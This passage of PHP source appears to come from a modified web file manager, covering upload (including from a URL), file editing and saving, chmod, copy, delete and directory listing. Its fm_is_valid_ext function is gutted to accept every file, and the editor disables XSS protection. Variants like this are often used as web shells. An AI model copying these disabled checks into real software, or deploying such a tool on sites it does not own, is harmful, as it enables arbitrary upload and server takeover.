<input type="hidden" name="p" value="<?php echo fm_enc(FM_PATH) ?>">
<input type="hidden" name="fullpath" id="fullpath" value="<?php echo fm_enc(FM_PATH) ?>">
<input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">
<div class="fallback">
<input name="file" type="file" multiple/>
</div>
</form>
<div class="upload-url-wrapper card-tabs-container hidden" id="urlUploader">
<form id="js-form-url-upload" class="row row-cols-lg-auto g-3 align-items-center" onsubmit="return upload_from_url(this);" method="POST" action="">
<input type="hidden" name="type" value="upload" aria-label="hidden" aria-hidden="true">
<input type="url" placeholder="URL" name="uploadurl" required class="form-control" style="width: 80%">
<input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">
<button type="submit" class="btn btn-primary ms-3">Upload</button>
<div class="lds-facebook"><div></div><div></div><div></div></div>
</form>
<div id="js-url-upload__list" class="col-9 mt-3"></div>
</div>
</div>
</div>
</div>
<script src="https://cdnjs.cloudflare.com/ajax/libs/dropzone/5.9.3/min/dropzone.min.js"></script>
<script>
Dropzone.options.fileUploader={
chunking: true,
chunkSize: 2000000,
forceChunking: true,
retryChunks: true,
retryChunksLimit: 3,
parallelUploads: 1,
parallelChunkUploads: false,
timeout: 120000,
maxFilesize:5000000000,
acceptedFiles : "<?php echo getUploadExt() ?>",
init: function (){
this.on("sending", function (file, xhr, formData){
let _path=(file.fullPath)?file.fullPath : file.name;
document.getElementById("fullpath").value=_path;
xhr.ontimeout=(function(){
toast('Error: Server Timeout');
});
}).on("success", function (res){
let _response=JSON.parse(res.xhr.response);
if(_response.status=="error"){
toast(_response.info);
}
}).on("error", function(file, response){
toast(response);
});
}
}
</script>
<?php
fm_show_footer();
exit;
}
if(isset($_POST['copy'])){
$copy_files=isset($_POST['file'])?$_POST['file'] : null;
if(!is_array($copy_files)||empty($copy_files)){
fm_set_msg('Nothing selected','alert');
$FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL.'?p='.urlencode($FM_PATH));
}
fm_show_header();
fm_show_nav_path(FM_PATH);
?>
<div class="path">
<div class="card text-white bg-dark">
<div class="card-header">
<h6>Copying</h6>
</div>
<div class="card-body">
<form action="" method="post">
<input type="hidden" name="p" value="<?php echo fm_enc(FM_PATH) ?>">
<input type="hidden" name="finish" value="1">
<?php
foreach($copy_files as $cf){
echo '<input type="hidden" name="file[]" value="'.fm_enc($cf).'">'.PHP_EOL;
}
?>
<p class="break-word"><strong>Files</strong>: <b><?php echo implode('</b>, <b>', $copy_files) ?></b></p>
<p class="break-word"><strong>SourceFolder</strong>: <?php echo fm_enc(fm_convert_win(FM_ROOT_PATH.'/'.FM_PATH)) ?><br>
<label for="inp_copy_to"><strong>DestinationFolder</strong>:</label>
<?php echo FM_ROOT_PATH ?>/<input type="text" name="copy_to" id="inp_copy_to" value="<?php echo fm_enc(FM_PATH) ?>">
</p>
<p class="custom-checkbox custom-control"><input type="checkbox" name="move" value="1" id="js-move-files" class="custom-control-input"><label for="js-move-files" class="custom-control-label ms-2"> Move</label></p>
<p>
<b><a href="?p=<?php echo urlencode(FM_PATH) ?>" class="btn btn-outline-danger">Cancel</a></b>&nbsp;
<input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">
<button type="submit" class="btn btn-success">Copy</button> 
</p>
</form>
</div>
</div>
</div>
<?php
fm_show_footer();
exit;
}
if(isset($_GET['copy'])&&!isset($_GET['finish'])){
$copy=$_GET['copy'];
$copy=fm_clean_path($copy);
if($copy==''||!file_exists(FM_ROOT_PATH.'/'.$copy)){
fm_set_msg('File not found','error');
$FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL.'?p='.urlencode($FM_PATH));
}
fm_show_header();
fm_show_nav_path(FM_PATH);
?>
<div class="path">
<p><b>Copying</b></p>
<p class="break-word">
<strong>Source path:</strong> <?php echo fm_enc(fm_convert_win(FM_ROOT_PATH.'/'.$copy)) ?><br>
<strong>Destination folder:</strong> <?php echo fm_enc(fm_convert_win(FM_ROOT_PATH.'/'.FM_PATH)) ?>
</p>
<p>
<b><a href="?p=<?php echo urlencode(FM_PATH) ?>&amp;copy=<?php echo urlencode($copy) ?>&amp;finish=1">Copy</a></b> &nbsp;
<b><a href="?p=<?php echo urlencode(FM_PATH) ?>&amp;copy=<?php echo urlencode($copy) ?>&amp;finish=1&amp;move=1">Move</a></b> &nbsp;
<b><a href="?p=<?php echo urlencode(FM_PATH) ?>" class="text-danger">Cancel</a></b>
</p>
<p><i>Select folder</i></p>
<ul class="folders break-word">
<?php
if($parent!==false){
?>
<li><a href="?p=<?php echo urlencode($parent) ?>&amp;copy=<?php echo urlencode($copy) ?>">BACK</a></li>
<?php
}
foreach($folders as $f){
?>
<li>
<a href="?p=<?php echo urlencode(trim(FM_PATH.'/'.$f, '/')) ?>&amp;copy=<?php echo urlencode($copy) ?>">📁 <?php echo fm_convert_win($f) ?></a></li>
<?php
}
?>
</ul>
</div>
<?php
fm_show_footer();
exit;
}
if(isset($_GET['view'])){
$file=$_GET['view'];
$file=fm_clean_path($file, false);
$file=str_replace('/','', $file);
if($file==''||!is_file($path.'/'.$file)||in_array($file, $GLOBALS['exclude_items'])){
fm_set_msg('File not found','error');
$FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL.'?p='.urlencode($FM_PATH));
}
fm_show_header();
fm_show_nav_path(FM_PATH);
$file_url=FM_ROOT_URL.fm_convert_win((FM_PATH!=''?'/'.FM_PATH : '').'/'.$file);
$file_path=$path.'/'.$file;
$ext=strtolower(pathinfo($file_path, PATHINFO_EXTENSION));
$mime_type=fm_get_mime_type($file_path);
$filesize_raw=fm_get_size($file_path);
$filesize=fm_get_filesize($filesize_raw);
$is_zip=false;
$is_gzip=false;
$is_image=false;
$is_audio=false;
$is_video=false;
$is_text=false;
$is_onlineViewer=false;
$view_title='File';
$filenames=false;
$content='';
$online_viewer=strtolower(FM_DOC_VIEWER);
if($online_viewer&&$online_viewer!=='false'&&in_array($ext, fm_get_onlineViewer_exts())){
$is_onlineViewer=true;
}
elseif($ext=='zip'||$ext=='tar'){
$is_zip=true;
$view_title='Archive';
$filenames=fm_get_zif_info($file_path, $ext);
}elseif(in_array($ext, fm_get_image_exts())){
$is_image=true;
$view_title='Image';
}elseif(in_array($ext, fm_get_audio_exts())){
$is_audio=true;
$view_title='Audio';
}elseif(in_array($ext, fm_get_video_exts())){
$is_video=true;
$view_title='Video';
}elseif(in_array($ext, fm_get_text_exts())||substr($mime_type, 0, 4)=='text'||in_array($mime_type, fm_get_text_mimes())){
$is_text=true;
$content=file_get_contents($file_path);
}
?>
<div class="row">
<div class="col-12">
<p class="break-word"><b><?php echo $view_title;?> "<?php echo fm_enc(fm_convert_win($file)) ?>"</b></p>
<p class="break-word">
<?php $display_path=fm_get_display_path($file_path); ?>
<strong><?php echo $display_path['label']; ?>:</strong> <?php echo $display_path['path']; ?><br>
<strong>File size:</strong> <?php echo ($filesize_raw <= 1000)?"$filesize_raw bytes" : $filesize; ?><br>
<strong>MIME-type:</strong> <?php echo $mime_type ?><br>
<?php
if(($is_zip||$is_gzip)&&$filenames!==false){
$total_files=0;
$total_comp=0;
$total_uncomp=0;
foreach($filenames as $fn){
if(!$fn['folder']){
$total_files++;
}
$total_comp += $fn['compressed_size'];
$total_uncomp += $fn['filesize'];
}
?>
<?php echo 'Files in archive' ?>: <?php echo $total_files ?><br>
<?php echo 'Total size' ?>: <?php echo fm_get_filesize($total_uncomp) ?><br>
<?php echo 'Size in archive' ?>: <?php echo fm_get_filesize($total_comp) ?><br>
<?php echo 'Compression' ?>: <?php echo round(($total_comp / max($total_uncomp, 1)) * 100) ?>%<br>
<?php
}
if($is_image){
$image_size=getimagesize($file_path);
echo '<strong>Image size:</strong> '.(isset($image_size[0])?$image_size[0] : '0').' x '.(isset($image_size[1])?$image_size[1] : '0').'<br>';
}
if($is_text){
$is_utf8=fm_is_utf8($content);
if(function_exists('iconv')){
if(!$is_utf8){
$content=iconv(FM_ICONV_INPUT_ENC, 'UTF-8//IGNORE', $content);
}
}
echo '<strong>Charset:</strong> '.($is_utf8?'utf-8':'8 bit').'<br>';
}
?>
</p>
<div class="d-flex align-items-center mb-3">
<form method="post" class="d-inline ms-2" action="?p=<?php echo urlencode(FM_PATH) ?>&amp;dl=<?php echo urlencode($file) ?>">
<input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">
<button type="submit" class="btn btn-link text-decoration-none fw-bold p-0">Download</button> &nbsp;
</form>
<b class="ms-2"><a href="<?php echo fm_enc($file_url) ?>" target="_blank">Open</a></b>
<?php
if(($is_zip||$is_gzip)&&$filenames!==false){
$zip_name=pathinfo($file_path, PATHINFO_FILENAME);
?>
<form method="post" class="d-inline ms-2">
<input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">
<input type="hidden" name="unzip" value="<?php echo urlencode($file); ?>">
<button type="submit" class="btn btn-link text-decoration-none fw-bold p-0" style="font-size: 14px;">UnZip</button>
</form>&nbsp;
<form method="post" class="d-inline ms-2">
<input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">
<input type="hidden" name="unzip" value="<?php echo urlencode($file); ?>">
<input type="hidden" name="tofolder" value="1">
<button type="submit" class="btn btn-link text-decoration-none fw-bold p-0" style="font-size: 14px;" title="UnZip to <?php echo fm_enc($zip_name) ?>">UnZipToFolder</button>
</form>&nbsp;
<?php
}
if($is_text){
?>
<b class="ms-2"><a href="?p=<?php echo urlencode(trim(FM_PATH)) ?>&amp;edit=<?php echo urlencode($file) ?>" class="edit-file">Edit</a></b> &nbsp;
<b class="ms-2"><a href="?p=<?php echo urlencode(trim(FM_PATH)) ?>&amp;edit=<?php echo urlencode($file) ?>&env=ace"	class="edit-file">AdvancedEditor</a></b> &nbsp;
<?php } ?>
<b class="ms-2"><a href="?p=<?php echo urlencode(FM_PATH) ?>">Back</a></b>
</div>
<?php
if($is_onlineViewer){
if($online_viewer=='google'){
echo '<iframe src="https://docs.google.com/viewer?embedded=true&hl=en&url='.fm_enc($file_url).'" frameborder="no" style="width:100%;min-height:460px"></iframe>';
}else if($online_viewer=='microsoft'){
echo '<iframe src="https://view.officeapps.live.com/op/embed.aspx?src='.fm_enc($file_url).'" frameborder="no" style="width:100%;min-height:460px"></iframe>';
}
}elseif($is_zip){
if($filenames!==false){
echo '<code class="maxheight">';
foreach($filenames as $fn){
if($fn['folder']){
echo '<b>'.fm_enc($fn['name']).'</b><br>';
}else{
echo $fn['name'].' ('.fm_get_filesize($fn['filesize']).')<br>';
}
}
echo '</code>';
}else{
echo '<p>Error while fetching archive info</p>';
}
}elseif($is_image){
if(in_array($ext, array('gif','jpg','jpeg','png','bmp','ico','svg','webp','avif'))){
echo '<p><input type="checkbox" id="preview-img-zoomCheck"><label for="preview-img-zoomCheck"><img src="'.fm_enc($file_url).'" alt="image" class="preview-img"></label></p>';
}
}elseif($is_audio){
echo '<p><audio src="'.fm_enc($file_url).'" controls preload="metadata"></audio></p>';
}elseif($is_video){
echo '<div class="preview-video"><video src="'.fm_enc($file_url).'" width="640" height="360" controls preload="metadata"></video></div>';
}elseif($is_text){
$hljs_classes=array(
'shtml'=>'xml',
'htaccess'=>'apache',
'phtml'=>'php',
'lock'=>'json',
'svg'=>'xml',
);
$hljs_class=isset($hljs_classes[$ext])?'lang-'.$hljs_classes[$ext] : 'lang-'.$ext;
if(empty($ext)||in_array(strtolower($file), fm_get_text_names())||preg_match('#\.min\.(css|js)$#i', $file)){
$hljs_class='nohighlight';
}
$content='<pre class="with-hljs"><code class="'.$hljs_class.'">'.fm_enc($content).'</code></pre>';
echo $content;
}
?>
</div>
</div>
<?php
fm_show_footer();
exit;
}
if(isset($_GET['edit'])){
$file=$_GET['edit'];
$file=fm_clean_path($file, false);
$file=str_replace('/','', $file);
if($file==''||!is_file($path.'/'.$file)||in_array($file, $GLOBALS['exclude_items'])){
fm_set_msg('File not found','error');
$FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL.'?p='.urlencode($FM_PATH));
}
$editFile=' : <i><b>'. $file. '</b></i>';
header('X-XSS-Protection:0');
fm_show_header();
fm_show_nav_path(FM_PATH);
$file_url=FM_ROOT_URL.fm_convert_win((FM_PATH!=''?'/'.FM_PATH : '').'/'.$file);
$file_path=$path.'/'.$file;
$isNormalEditor=true;
if(isset($_GET['env'])){
if($_GET['env']=="ace"){
$isNormalEditor=false;
}
}
if(isset($_POST['savedata'])){
$writedata=$_POST['savedata'];
$fd=fopen($file_path, "w");
@fwrite($fd, $writedata);
fclose($fd);
fm_set_msg('File Saved Successfully');
}
$ext=strtolower(pathinfo($file_path, PATHINFO_EXTENSION));
$mime_type=fm_get_mime_type($file_path);
$filesize=filesize($file_path);
$is_text=false;
$content='';
if(in_array($ext, fm_get_text_exts())||substr($mime_type, 0, 4)=='text'||in_array($mime_type, fm_get_text_mimes())){
$is_text=true;
$content=file_get_contents($file_path);
}
?>
<div class="path">
<div class="row">
<div class="col-xs-12 col-sm-5 col-lg-6 pt-1">
<div class="btn-toolbar" role="toolbar">
<?php if(!$isNormalEditor){ ?>
<div class="btn-group js-ace-toolbar">
<button data-cmd="none" data-option="fullscreen" class="btn btn-sm btn-outline-secondary" id="js-ace-fullscreen">Fullscreen</button>
<button data-cmd="find" class="btn btn-sm btn-outline-secondary" id="js-ace-search">Search</button>
<button data-cmd="undo" class="btn btn-sm btn-outline-secondary" id="js-ace-undo">Undo</button>
<button data-cmd="redo" class="btn btn-sm btn-outline-secondary" id="js-ace-redo">Redo</button>
<button data-cmd="none" data-option="wrap" class="btn btn-sm btn-outline-secondary" id="js-ace-wordWrap">Word Wrap</button>
<select id="js-ace-mode" data-type="mode" title="Select Document Type" class="btn-outline-secondary border-start-0 d-none d-md-block"><option>-- Select Mode --</option></select>
<select id="js-ace-theme" data-type="theme" title="Select Theme" class="btn-outline-secondary border-start-0 d-none d-lg-block"><option>-- Select Theme --</option></select>
<select id="js-ace-fontSize" data-type="fontSize" title="Select Font Size" class="btn-outline-secondary border-start-0 d-none d-lg-block"><option>-- Select Font Size --</option></select>
</div>
<?php } ?>
</div>
</div>
<div class="edit-file-actions col-xs-12 col-sm-7 col-lg-6 text-end pt-1">
<a title="Back" class="btn btn-sm btn-outline-primary" href="?p=<?php echo urlencode(trim(FM_PATH)) ?>&amp;view=<?php echo urlencode($file) ?>">Back</a>
<a title="BackUp" class="btn btn-sm btn-outline-primary" href="javascript:void(0);" onclick="backup('<?php echo urlencode(trim(FM_PATH)) ?>','<?php echo urlencode($file) ?>')">BackUp</a>
<?php if($is_text){ ?>
<?php if($isNormalEditor){ ?>
<a title="Advanced" class="btn btn-sm btn-outline-primary" href="?p=<?php echo urlencode(trim(FM_PATH)) ?>&amp;edit=<?php echo urlencode($file) ?>&amp;env=ace">AdvancedEditor</a>
<button type="button" class="btn btn-sm btn-success" name="Save" data-url="<?php echo fm_enc($file_url) ?>" onclick="edit_save(this,'nrl')">Save
</button>
<?php }else{ ?>
<a title="Plain Editor" class="btn btn-sm btn-outline-primary" href="?p=<?php echo urlencode(trim(FM_PATH)) ?>&amp;edit=<?php echo urlencode($file) ?>">NormalEditor</a>
<button type="button" class="btn btn-sm btn-success" name="Save" data-url="<?php echo fm_enc($file_url) ?>" onclick="edit_save(this,'ace')">Save</button>
<?php } ?>
<?php } ?>
</div>
</div>
<?php
if($is_text&&$isNormalEditor){
echo '<textarea class="mt-2" id="normal-editor" rows="33" cols="120" style="width: 99.5%;">'.htmlspecialchars($content).'</textarea>';
echo '<script>document.addEventListener("keydown", function(e){if((window.navigator.platform.match("Mac")?e.metaKey : e.ctrlKey) &&e.keyCode==83){ e.preventDefault();edit_save(this,"nrl");}}, false);</script>';
}elseif($is_text){
echo '<div id="editor" contenteditable="true">'.htmlspecialchars($content).'</div>';
}else{
fm_set_msg('FILE EXTENSION HAS NOT SUPPORTED', 'error');
}
?>
</div>
<?php
fm_show_footer();
exit;
}
if(isset($_GET['chmod'])){
$file=$_GET['chmod'];
$file=fm_clean_path($file);
$file=str_replace('/','', $file);
if($file==''||(!is_file($path.'/'.$file)&&!is_dir($path.'/'.$file))){
fm_set_msg('File not found', 'error');
$FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL.'?p='.urlencode($FM_PATH));
}
fm_show_header();
fm_show_nav_path(FM_PATH);
$file_url=FM_ROOT_URL.(FM_PATH!=''?'/'.FM_PATH : '').'/'.$file;
$file_path=$path.'/'.$file;
$mode=fileperms($path.'/'.$file);
?>
<div class="path">
<div class="card mb-2 text-white bg-dark">
<h6 class="card-header">ChangePermissions</h6>
<div class="card-body">
<p class="card-text">
<?php $display_path=fm_get_display_path($file_path); ?>
<?php echo $display_path['label']; ?>: <?php echo $display_path['path']; ?><br>
</p>
<form action="" method="post">
<input type="hidden" name="p" value="<?php echo fm_enc(FM_PATH) ?>">
<input type="hidden" name="chmod" value="<?php echo fm_enc($file) ?>">
<table class="table compact-table text-white bg-dark">
<tr>
<td></td>
<td><b>Owner</b></td>
<td><b>Group</b></td>
<td><b>Other</b></td>
</tr>
<tr>
<td style="text-align: right"><b>Read</b></td>
<td><label><input type="checkbox" name="ur" value="1"<?php echo ($mode & 00400)?' checked':'' ?>></label></td>
<td><label><input type="checkbox" name="gr" value="1"<?php echo ($mode & 00040)?' checked':'' ?>></label></td>
<td><label><input type="checkbox" name="or" value="1"<?php echo ($mode & 00004)?' checked':'' ?>></label></td>
</tr>
<tr>
<td style="text-align: right"><b>Write</b></td>
<td><label><input type="checkbox" name="uw" value="1"<?php echo ($mode & 00200)?' checked':'' ?>></label></td>
<td><label><input type="checkbox" name="gw" value="1"<?php echo ($mode & 00020)?' checked':'' ?>></label></td>
<td><label><input type="checkbox" name="ow" value="1"<?php echo ($mode & 00002)?' checked':'' ?>></label></td>
</tr>
<tr>
<td style="text-align: right"><b>Execute</b></td>
<td><label><input type="checkbox" name="ux" value="1"<?php echo ($mode & 00100)?' checked':'' ?>></label></td>
<td><label><input type="checkbox" name="gx" value="1"<?php echo ($mode & 00010)?' checked':'' ?>></label></td>
<td><label><input type="checkbox" name="ox" value="1"<?php echo ($mode & 00001)?' checked':'' ?>></label></td>
</tr>
</table>
<p>
<input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>"> 
<b><a href="?p=<?php echo urlencode(FM_PATH) ?>" class="btn btn-outline-primary">Cancel</a></b>&nbsp;
<button type="submit" class="btn btn-success">Change</button>
</p>
</form>
</div>
</div>
</div>
<?php
fm_show_footer();
exit;
}
fm_show_header();
fm_show_nav_path(FM_PATH);
fm_show_message();
$num_files=count($files);
$num_folders=count($folders);
$all_files_size=0;
?>
<form action="" method="post" class="pt-3">
<input type="hidden" name="p" value="<?php echo fm_enc(FM_PATH) ?>">
<input type="hidden" name="group" value="1">
<input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">
<div class="table-responsive">
<table class="table table-bordered table-hover table-sm text-white bg-dark table-dark" id="main-table">
<thead class="thead-white">
<tr>
<th style="width:3%" class="custom-checkbox-header">
<div class="custom-control custom-checkbox">
<input type="checkbox" class="custom-control-input" id="js-select-all-items" onclick="checkbox_toggle();">
<label class="custom-control-label" for="js-select-all-items"></label>
</div>
</th>
<th>Name</th>
<th>Size</th>
<th>Modified</th>
<th>Perms</th>
<th>Owner</th>
<th>Actions</th>
</tr>
</thead>
<?php
if($parent!==false){
?>
<tr>
<td class="nosort"></td>
<td class="border-0" data-sort><a href="?p=<?php echo urlencode($parent) ?>">◀️ ..</a></td>
<td class="border-0" data-order></td>
<td class="border-0" data-order></td>
<td class="border-0"></td>
<td class="border-0"></td>
<td class="border-0"></td>
</tr>
<?php
}
$ii=3399;
foreach($folders as $f){
$is_link=is_link($path.'/'.$f);
$modif_raw=filemtime($path.'/'.$f);
$modif=date(FM_DATETIME_FORMAT, $modif_raw);
$date_sorting=strtotime(date(FM_DATETIME_FORMAT, $modif_raw));
$filesize_raw="";
$filesize='Folder';
$perms=substr(decoct(fileperms($path.'/'.$f)), -4);
if(function_exists('posix_getpwuid')&&function_exists('posix_getgrgid')){
$owner=posix_getpwuid(fileowner($path.'/'.$f));
$group=posix_getgrgid(filegroup($path.'/'.$f));
if($owner === false){
$owner=array('name'=>'?');
}
if($group === false){
$group=array('name'=>'?');
}
}else{
$owner=array('name'=>'?');
$group=array('name'=>'?');
}
?>
<tr>
<td class="custom-checkbox-td">
<div class="custom-control custom-checkbox">
<input type="checkbox" class="custom-control-input" id="<?php echo $ii ?>" name="file[]" value="<?php echo fm_enc($f) ?>">
<label class="custom-control-label" for="<?php echo $ii ?>"></label>
</div>
</td>
<td data-sort="<?php echo fm_convert_win(fm_enc($f)) ?>">
<div class="filename"><a href="?p=<?php echo urlencode(trim(FM_PATH.'/'.$f, '/')) ?>">📁 <?php echo fm_convert_win(fm_enc($f)) ?>
</a><?php echo($is_link?' &rarr; <i>'.readlink($path.'/'.$f).'</i>':'') ?></div>
</td>
<td data-order="a-<?php echo str_pad($filesize_raw, 18, "0", STR_PAD_LEFT);?>">
<?php echo $filesize; ?>
</td>
<td data-order="a-<?php echo $date_sorting;?>"><?php echo $modif ?></td>
<td><a title="Change Permissions" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;chmod=<?php echo urlencode($f) ?>"><?php echo $perms ?></a></td>
<td><?php echo $owner['name'].':'.$group['name'] ?></td>
<td class="inline-actions">
<a title="Delete" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;del=<?php echo urlencode($f) ?>" onclick="confirmDailog(event, '1028','Delete Folder','<?php echo urlencode($f) ?>', this.href);"> 🗑️</a>
<a title="Rename" href="#" onclick="rename('<?php echo fm_enc(addslashes(FM_PATH)) ?>','<?php echo fm_enc(addslashes($f)) ?>');return false;">✒️</a>
<a title="CopyTo" href="?p=&amp;copy=<?php echo urlencode(trim(FM_PATH.'/'.$f, '/')) ?>">📋</a>
<a title="DirectLink" href="<?php echo fm_enc(FM_ROOT_URL.(FM_PATH!=''?'/'.FM_PATH : '').'/'.$f.'/') ?>" target="_blank">🔗</a>
</td>
</tr>
<?php
flush();
$ii++;
}
$ik=6070;
foreach($files as $f){
$is_link=is_link($path.'/'.$f);
$modif_raw=filemtime($path.'/'.$f);
$modif=date(FM_DATETIME_FORMAT, $modif_raw);
$date_sorting=strtotime(date("F d Y H:i:s.", $modif_raw));
$filesize_raw=fm_get_size($path.'/'.$f);
$filesize=fm_get_filesize($filesize_raw);
$filelink='?p='.urlencode(FM_PATH).'&amp;view='.urlencode($f);
$all_files_size += $filesize_raw;
$perms=substr(decoct(fileperms($path.'/'.$f)), -4);
if(function_exists('posix_getpwuid')&&function_exists('posix_getgrgid')){
$owner=posix_getpwuid(fileowner($path.'/'.$f));
$group=posix_getgrgid(filegroup($path.'/'.$f));
if($owner === false){
$owner=array('name'=>'?');
}
if($group === false){
$group=array('name'=>'?');
}
}else{
$owner=array('name'=>'?');
$group=array('name'=>'?');
}
?>
<tr>
<td class="custom-checkbox-td">
<div class="custom-control custom-checkbox">
<input type="checkbox" class="custom-control-input" id="<?php echo $ik ?>" name="file[]" value="<?php echo fm_enc($f) ?>">
<label class="custom-control-label" for="<?php echo $ik ?>"></label>
</div>
</td>
<td data-sort="<?php echo fm_enc($f) ?>">
<div class="filename">
<?php
if(in_array(strtolower(pathinfo($f, PATHINFO_EXTENSION)), array('gif','jpg','jpeg','png','bmp','ico','svg','webp','avif'))): ?>
<?php $imagePreview=fm_enc(FM_ROOT_URL.(FM_PATH!=''?'/'.FM_PATH : '').'/'.$f); ?>
<a href="<?php echo $filelink ?>" data-preview-image="<?php echo $imagePreview ?>" title="<?php echo fm_enc($f) ?>">
<?php else: ?>
<a href="<?php echo $filelink ?>" title="<?php echo $f ?>">
<?php endif; ?>
<?php echo fm_convert_win(fm_enc($f)) ?>
</a>
<?php echo($is_link?' &rarr; <i>'.readlink($path.'/'.$f).'</i>':'') ?>
</div>
</td>
<td data-order="b-<?php echo str_pad($filesize_raw, 18, "0", STR_PAD_LEFT); ?>"><span title="<?php printf('%s bytes', $filesize_raw) ?>">
<?php echo $filesize; ?>
</span></td>
<td data-order="b-<?php echo $date_sorting;?>"><?php echo $modif ?></td>
<td><a title="Change Permissions" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;chmod=<?php echo urlencode($f) ?>"><?php echo $perms ?></a>
<td><?php echo $owner['name'].':'.$group['name'] ?></td>
<td class="inline-actions">
<a title="Delete" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;del=<?php echo urlencode($f) ?>" onclick="confirmDailog(event, 1209, 'Delete File','<?php echo urlencode($f); ?>', this.href);"> 🗑️</a>
<a title="Rename" href="#" onclick="rename('<?php echo fm_enc(addslashes(FM_PATH)) ?>','<?php echo fm_enc(addslashes($f)) ?>');return false;">✒️</a>
<a title="CopyTo" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;copy=<?php echo urlencode(trim(FM_PATH.'/'.$f, '/')) ?>">📋</a>
<a title="DirectLink" href="<?php echo fm_enc(FM_ROOT_URL.(FM_PATH!=''?'/'.FM_PATH : '').'/'.$f) ?>" target="_blank">🔗</a>
<a title="Download" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;dl=<?php echo urlencode($f) ?>" onclick="confirmDailog(event, 1211, 'Download','<?php echo urlencode($f); ?>', this.href);">🔻</a>
</td>
</tr>
<?php
flush();
$ik++;
}
if(empty($folders)&&empty($files)){ ?>
<tfoot>
<tr>
<td></td>
<td colspan="6"><em>Folder is empty</em></td>
</tr>
</tfoot>
<?php
}else{ ?>
<tfoot>
<tr>
<td class="gray" colspan="7">
Size <span class="badge border-radius-0"><?php echo fm_get_filesize($all_files_size)?></span> File <span class="badge border-radius-0"><?php echo$num_files?></span> Folder <span class="badge border-radius-0"><?php echo$num_folders?></span>
</td>
</tr>
</tfoot>
<?php } ?>
</table>
</div>
<div class="row">
<div class="col-xs-12 col-sm-9">
<ul class="list-inline footer-action">
<li class="list-inline-item"> <a href="#/select-all" class="btn btn-small btn-outline-primary btn-2" onclick="select_all();return false;">SelectAll</a></li>
<li class="list-inline-item"><a href="#/unselect-all" class="btn btn-small btn-outline-primary btn-2" onclick="unselect_all();return false;">UnSelectAll</a></li>
<li class="list-inline-item"><a href="#/invert-all" class="btn btn-small btn-outline-primary btn-2" onclick="invert_all();return false;">InvertSelection</a></li>
<li class="list-inline-item"><input type="submit" class="hidden" name="delete" id="a-delete" value="Delete" onclick="return confirm('Delete selected files and folders?');">
<a href="javascript:document.getElementById('a-delete').click();" class="btn btn-small btn-outline-primary btn-2">Delete</a></li>
<li class="list-inline-item"><input type="submit" class="hidden" name="zip" id="a-zip" value="zip" onclick="return confirm('Create archive?');">
<a href="javascript:document.getElementById('a-zip').click();" class="btn btn-small btn-outline-primary btn-2">Zip</a></li>
<li class="list-inline-item"><input type="submit" class="hidden" name="tar" id="a-tar" value="tar" onclick="return confirm('Create archive?')">
<a href="javascript:document.getElementById('a-tar').click();" class="btn btn-small btn-outline-primary btn-2">Tar</a></li>
<li class="list-inline-item"><input type="submit" class="hidden" name="copy" id="a-copy" value="Copy">
<a href="javascript:document.getElementById('a-copy').click();" class="btn btn-small btn-outline-primary btn-2">Copy</a></li>
</ul>
</div>
</div>
</form>
<?php
fm_show_footer();
function verifyToken($token) 
{
if(hash_equals($_SESSION['token'], $token)){ 
return true;
}
return false;
}
function fm_rdelete($path)
{
if(is_link($path)){
return unlink($path);
}elseif(is_dir($path)){
$objects=scandir($path);
$ok=true;
if(is_array($objects)){
foreach($objects as $file){
if($file!='.'&&$file!='..'){
if(!fm_rdelete($path.'/'.$file)){
$ok=false;
}
}
}
}
return ($ok)?rmdir($path) : false;
}elseif(is_file($path)){
return unlink($path);
}
return false;
}
function fm_rchmod($path, $filemode, $dirmode)
{
if(is_dir($path)){
if(!chmod($path, $dirmode)){
return false;
}
$objects=scandir($path);
if(is_array($objects)){
foreach($objects as $file){
if($file!='.'&&$file!='..'){
if(!fm_rchmod($path.'/'.$file, $filemode, $dirmode)){
return false;
}
}
}
}
return true;
}elseif(is_link($path)){
return true;
}elseif(is_file($path)){
return chmod($path, $filemode);
}
return false;
}
function fm_is_valid_ext($filename)
{
$allowed =false;
$ext=strtolower(pathinfo($filename, PATHINFO_EXTENSION));
$isFileAllowed=true;
return ($isFileAllowed)?true : false;
}
function fm_rename($old, $new)
{
$isFileAllowed=fm_is_valid_ext($new);
if(!is_dir($old)){
if(!$isFileAllowed) return false;
}
return (!file_exists($new)&&file_exists($old))?rename($old, $new) : null;
}
function fm_rcopy($path, $dest, $upd=true, $force=true)
{
if(is_dir($path)){
if(!fm_mkdir($dest, $force)){
return false;
}
$objects=scandir($path);
$ok=true;
if(is_array($objects)){
foreach($objects as $file){
if($file!='.'&&$file!='..'){
if(!fm_rcopy($path.'/'.$file, $dest.'/'.$file)){
$ok=false;
}
}
}
}
return $ok;
}elseif(is_file($path)){
return fm_copy($path, $dest, $upd);
}
return false;
}
function fm_mkdir($dir, $force)
{
if(file_exists($dir)){
if(is_dir($dir)){
return $dir;
}elseif(!$force){
return false;
}
unlink($dir);
}
return mkdir($dir, 0777, true);
}
function fm_copy($f1, $f2, $upd)
{
$time1=filemtime($f1);
if(file_exists($f2)){
$time2=filemtime($f2);
if($time2 >= $time1&&$upd){
return false;
}
}
$ok=copy($f1, $f2);
if($ok){
touch($f2, $time1);
}
return $ok;
}
function fm_get_mime_type($file_path)
{
if(function_exists('finfo_open')){
$finfo=finfo_open(FILEINFO_MIME_TYPE);
$mime=finfo_file($finfo, $file_path);
finfo_close($finfo);
return $mime;
}elseif(function_exists('mime_content_type')){
return mime_content_type($file_path);
}elseif(!stristr(ini_get('disable_functions'), 'shell_exec')){
$file=escapeshellarg($file_path);
$mime=shell_exec('file -bi '.$file);
return $mime;
}else{
return '--';
}
}
